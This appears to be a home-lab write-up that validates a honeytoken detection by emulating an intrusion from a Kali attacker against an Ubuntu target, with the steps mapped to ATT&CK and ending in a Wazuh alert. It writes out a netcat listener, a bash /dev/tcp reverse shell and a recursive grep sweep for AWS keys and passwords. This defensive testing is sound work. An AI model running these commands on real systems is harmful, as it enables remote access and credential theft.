# Attack Chain - Live Validation

The strongest proof that a honeytoken works is a *realistic* attack tripping it, not a
manual read. This is the Phase 4 adversary emulation: a full intrusion launched from the
Kali attacker (`192.168.32.136`) against the Ubuntu target (`192.168.32.138`).

The attacker never targeted the bait. Their generic credential sweep found it because it
was indistinguishable from real loot - and that read fired the detection.

---

## 1. Initial access - reverse shell

Listener on Kali:

```bash
nc -lvnp 4444
```

Reverse shell from the target (models the post-execution moment of a compromise):

```bash
bash -i >& /dev/tcp/192.168.32.136/4444 0>&1
```

Foothold confirmed: `whoami` = `cletus1`, `hostname` = `cletus-ubuntu-target`.
**Evidence:** `evidence/09-reverse-shell-established.png`
**ATT&CK:** T1059 - Command & Scripting Interpreter

## 2. Discovery

```bash
id
uname -a
ls -la /home/cletus1
```

The compromised user is in the `sudo` group; the `.aws` directory is visible as apparent loot.
**Evidence:** `evidence/10-attacker-discovery.png`
**ATT&CK:** T1083 - File & Directory Discovery

## 3. Credential sweep - the trigger

An automated hunt for secrets across the home directory, exactly what real
post-exploitation tooling does:

```bash
grep -rniel "aws_access_key\|secret\|password\|api_key" /home/cletus1 2>/dev/null
```

The sweep read the honeytoken **as a side effect of ordinary looting**. No legitimate
process greps that file for `aws_access_key`, so this read is a true positive by construction.

## 4. Detection fired

Wazuh rule **100300** raised a **level-12** alert carrying `data.audit.command: grep` -
proving the honeytoken was caught during a realistic credential sweep, not a manual read.
**Evidence:** `evidence/11-honeytoken-alert-from-attack.png` (the centerpiece)
**ATT&CK:** T1552.001 - Unsecured Credentials: Credentials In Files

## 5. Cleanup

Closed the reverse shell (`exit`) and the netcat listener (`Ctrl+C`).

---

**Result:** the full chain - reverse shell → discovery → credential sweep - was detected by
the deception layer at the credential-access trip, with zero prior tuning. See
[`../detections/ADS-001-aws-honeytoken.md`](../detections/ADS-001-aws-honeytoken.md) for the
detection design and [`../docs/project-log.md`](../docs/project-log.md) for the full build log.
